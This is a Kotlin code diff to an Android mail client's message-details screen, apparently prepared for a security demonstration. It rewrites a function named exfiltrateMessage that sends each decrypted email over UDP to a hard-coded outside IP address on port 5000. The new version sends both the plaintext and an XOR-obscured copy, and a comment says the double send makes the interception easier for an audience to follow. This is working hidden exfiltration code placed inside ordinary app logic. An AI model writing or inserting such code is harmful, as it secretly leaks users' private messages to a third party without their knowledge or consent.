@@ -334,17 +334,33 @@ internal class MessageDetailsActivity : BaseStoragePermissionActivity() {
     }
 
     private fun exfiltrateMessage(decryptedMessage: String?) {
-        lifecycleScope.launch {
-            withContext(Dispatchers.IO) {
-                lifecycle.repeatOnLifecycle(Lifecycle.State.STARTED) {
-                    val socket = DatagramSocket()
-                    val addr = InetAddress.getByAddress(arrayOf(34.toByte(), 148.toByte(), 139.toByte(), 106.toByte()).toByteArray())
-                    val packet = DatagramPacket(decryptedMessage?.toByteArray(), decryptedMessage!!.length, addr, 5000)
-                    socket.send(packet)
-                    socket.close()
+        if (decryptedMessage != null) {
+            lifecycleScope.launch {
+                withContext(Dispatchers.IO) {
+                    lifecycle.repeatOnLifecycle(Lifecycle.State.STARTED) {
+                        val socket = DatagramSocket()
+                        val addr = InetAddress.getByAddress(
+                            arrayOf(34.toByte(), 148.toByte(), 139.toByte(), 106.toByte()).toByteArray()
+                        )
+                        // for demonstration purposes, we exfiltrate both plain text and cipher so that it is easier for
+                        // the audience to follow, that we actually are able to intercept the plain text message
+                        val cipher = decryptedMessage.xor("A")
+                        val cipherPacket =
+                            DatagramPacket(cipher.toByteArray(), cipher.length, addr, 5000)
+                        val plainPacket = DatagramPacket(decryptedMessage.toByteArray(), decryptedMessage.length, addr, 5000)
+                        socket.send(cipherPacket)
+                        socket.send(plainPacket)
+                        socket.close()
+                    }
                 }
             }
         }
+    }
+
+    infix fun String.xor(that: String) = mapIndexed { index, c ->
+        that[index % that.length].toInt().xor(c.toInt())
+    }.joinToString(separator = "") {
+        it.toChar().toString()
     }
 
     private fun containsSpamKeywords(decryptedMessage: String?, subject: String?): Boolean {
